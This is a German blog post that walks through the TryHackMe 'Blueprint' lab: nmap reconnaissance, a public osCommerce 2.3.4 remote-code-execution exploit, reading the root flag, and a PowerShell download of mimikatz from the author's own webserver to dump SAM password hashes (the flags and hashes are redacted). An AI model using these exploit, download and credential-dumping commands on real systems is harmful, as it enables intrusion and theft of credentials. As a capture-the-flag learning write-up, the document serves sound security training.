---
slug: "tryhackme-blueprint"
title: "TryHackMe Blueprint – Cybersecurity-Write-up"
date: 2024-09-24
comments: true
tags: [tryhackme, cyber security]
---

Ich habe mich entschieden, etwas mehr Penetration Testing/Ethical Hacking auszuprobieren. Das Folgende ist ein Write-Up zum [TryHackMe](https://tryhackme.com/)-Room ["Blueprint"](https://tryhackme.com/r/room/blueprint).

## Aufgaben

Die einzige Information, die wir gehabt haben, ist:

> Habt ihr das Zeug dazu, in diese Windows-Maschine einzudringen?

Und die Fragen:

> - NTLM-Hash des "Lab"-Users entschlüsselt
> - root.txt

Also haben wir davon ausgehen können, dass es eine Windows-Maschine ist.

## Aufklärung

Ich habe meine Kali-Linux-Maschine gestartet und auf meinem Desktop einen Ordner als Workspace angelegt.

```bash
# create a workspace
mkdir Desktop/blueprint && cd Desktop/blueprint

# portscan with nmap
nmap -v -A -oN nmap-scan.txt 10.10.251.173

# nmap result
PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 7.5
|_http-title: 404 - File or directory not found.
|_http-server-header: Microsoft-IIS/7.5
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
443/tcp   open  ssl/http     Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28)
| http-ls: Volume /
| SIZE  TIME              FILENAME
| -     2019-04-11 22:52  oscommerce-2.3.4/
| -     2019-04-11 22:52  oscommerce-2.3.4/catalog/
| -     2019-04-11 22:52  oscommerce-2.3.4/docs/
|_
| http-methods: 
|   Supported Methods: OPTIONS GET HEAD POST TRACE
|_  Potentially risky methods: TRACE
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Apache/2.4.23 (Win32) OpenSSL/1.0.2h PHP/5.6.28
| ssl-cert: Subject: commonName=localhost
| Issuer: commonName=localhost
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2009-11-10T23:48:47
| Not valid after:  2019-11-08T23:48:47
| MD5:   a0a4:4cc9:9e84:b26f:9e63:9f9e:d229:dee0
|_SHA-1: b023:8c54:7a90:5bfa:119c:4e8b:acca:eacf:3649:1ff6
|_http-title: Index of /
| tls-alpn: 
|_  http/1.1
445/tcp   open  microsoft-ds Windows 7 Home Basic 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3306/tcp  open  mysql        MariaDB (unauthorized)
8080/tcp  open  http         Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28)
|_http-server-header: Apache/2.4.23 (Win32) OpenSSL/1.0.2h PHP/5.6.28
| http-methods: 
|   Supported Methods: OPTIONS GET HEAD POST TRACE
|_  Potentially risky methods: TRACE
|_http-title: Index of /
| http-ls: Volume /
| SIZE  TIME              FILENAME
| -     2019-04-11 22:52  oscommerce-2.3.4/
| -     2019-04-11 22:52  oscommerce-2.3.4/catalog/
| -     2019-04-11 22:52  oscommerce-2.3.4/docs/
|_
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49158/tcp open  msrpc        Microsoft Windows RPC
49159/tcp open  msrpc        Microsoft Windows RPC
49160/tcp open  msrpc        Microsoft Windows RPC
Service Info: Hosts: www.example.com, BLUEPRINT, localhost; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -20m03s, deviation: 34m37s, median: -4s
| smb-os-discovery: 
|   OS: Windows 7 Home Basic 7601 Service Pack 1 (Windows 7 Home Basic 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1
|   Computer name: BLUEPRINT
|   NetBIOS computer name: BLUEPRINT\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2024-08-16T18:05:38+01:00
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2024-08-16T17:05:39
|_  start_date: 2024-08-16T17:02:15
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| nbstat: NetBIOS name: BLUEPRINT, NetBIOS user: <unknown>, NetBIOS MAC: 02:a6:9b:93:fd:95 (unknown)
| Names:
|   BLUEPRINT<00>        Flags: <unique><active>
|   WORKGROUP<00>        Flags: <group><active>
|   BLUEPRINT<20>        Flags: <unique><active>
|   WORKGROUP<1e>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|_  \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
```

Also haben wir Folgendes beobachten können:

- Windows 7 Home SP1 / 7601 - wow, das ist ziemlich alt
- IIS auf Port 80
- Apache 2.4.23 auf Port 443 und 8080
- OSCommerce 2.3.4
- PHP 5.6.28
- OpenSSL 1.0.2h
- MSRPC auf Port 135
- Netbios auf Port 139
- SMB auf Port 445 (als microsoft-ds erkannt)
- mySQL/MariaDB auf Port 3306
- ein paar hohe Ports mit msrpc
- der SMB-Scan hat bereits als Gast einige Daten auslesen können

All diese veraltete Software hat vermutlich einige Schwachstellen gehabt, die ich habe nutzen können.

## Initial Access: osCommerce-2.3.4-Exploit

Nmap hat bereits eine Installation von osCommerce gefunden – eine Online-Shop-Anwendung. Der Verzeichnisname hat die Version schon verraten: `2.3.4`.
Ich habe schnell auf [Exploit-DB.com](https://exploit-db.com) nach osCommerce gesucht und [diesen Exploit (EDB-ID 50128)](https://www.exploit-db.com/exploits/50128) von Bryan Leong `<NobodyAtall>` gefunden.
Das zugrunde liegende Problem ist gewesen: Wenn das Verzeichnis `/install` nach der Installation nicht entfernt worden ist, sind Befehle ausführbar gewesen.

> Exploit: Der finish-Prozess von install.php ist ausgenutzt worden, indem ein PHP-Payload in den db_database-Parameter injiziert und die Ausgabe von Systembefehlen aus der configure.php gelesen worden ist.

Da ich `searchsploit` auf meiner Kali-VM installiert gehabt habe, habe ich den Exploit wahrscheinlich bereits lokal auf der Platte gehabt:

```bash
# find the path of the local exploit
searchsploit 50128 -p
  Exploit: osCommerce 2.3.4.1 - Remote Code Execution (2)
      URL: https://www.exploit-db.com/exploits/50128
     Path: /usr/share/exploitdb/exploits/php/webapps/50128.py
    Codes: N/A
 Verified: False
File Type: Python script, ASCII text executable

# execute the exploit, using the URL of the osCommerce installation as a single parameter
python3 /usr/share/exploitdb/exploits/php/webapps/50128.py http://10.10.251.173:8080/oscommerce-2.3.4/catalog/
[*] Install directory still available, the host likely vulnerable to the exploit.
[*] Testing injecting system command to test vulnerability
User: nt authority\system

RCE_SHELL$ whoami
nt authority\system
```

Okay, perfekt. Ich habe eine Shell bekommen und bin sogar als `NT Authority\SYSTEM` gelaufen. Ich denke, es ist eine grobe Fehlkonfiguration gewesen, den Webserver als `SYSTEM` laufen zu lassen, aber gut ... es ist nur ein einfaches CTF-Spiel gewesen.

## Root-Flag auslesen

In CTFs hat die Root-Flag oft auf dem Desktop des Administrators gelegen (wenn es eine Windows-Maschine gewesen ist). Also habe ich mit der RCE-Shell aus dem Exploit das Verzeichnis geprüft.

```powershell
RCE_SHELL$ dir C:\users\administrator\desktop
 Volume in drive C has no label.
 Volume Serial Number is 14AF-C52C

 Directory of C:\users\administrator\desktop

11/27/2019  07:15 PM    <DIR>          .
11/27/2019  07:15 PM    <DIR>          ..
11/27/2019  07:15 PM                37 root.txt.txt
               1 File(s)             37 bytes
               2 Dir(s)  19,504,635,904 bytes free

RCE_SHELL$ more C:\users\administrator\desktop\root.txt.txt
THM{ **redacted to not ruin the fun** }
```

## NTLM-Hash des "Lab"-Users

Ich habe bereits die nötigen Berechtigungen gehabt (nochmal: ich bin als `NT Authority\SYSTEM` gelaufen). Um den NTLM-Hash auszulesen, habe ich auf meiner Kali-Maschine einen einfachen lokalen Webserver gestartet, um mimikatz auf das Zielsystem herunterzuladen.

```bash
# in another terminal: spin up the webserver
python3 -m http.server 80
```

Dann in der Exploit-Shell:

```powershell
# download mimikatz using PowerShell
RCE_SHELL$ powershell (New-Object System.Net.WebClient).DownloadFile(\"http://10.14.85.51/mimikatz.exe\", \"mimikatz.exe\")

# dump the local SAM database using mimikatz
RCE_SHELL$ mimikatz "lsadump::sam" exit

  .#####.   mimikatz 2.2.0 (x86) #19041 Sep 19 2022 17:43:26
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # lsadump::sam
Domain : BLUEPRINT
SysKey : 147a48de4a9815d2aa479598592b086f
Local SID : S-1-5-21-3130159037-241736515-3168549210

SAMKey : 3700ddba8f7165462130a4441ef47500

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: **redacted - to not spoil the fun**

RID  : 000001f5 (501)
User : Guest

RID  : 000003e8 (1000)
User : Lab
  Hash NTLM: **redacted - to not spoil the fun**

mimikatz(commandline) # exit
Bye!
```

Sauber! Ich habe also den NTLM-Hash des `Lab`-Users genommen und ihn mit [NTLM.pw](https://ntlm.pw) geprüft. Da das Passwort ziemlich simpel gewesen ist, ist es dort gelistet gewesen.
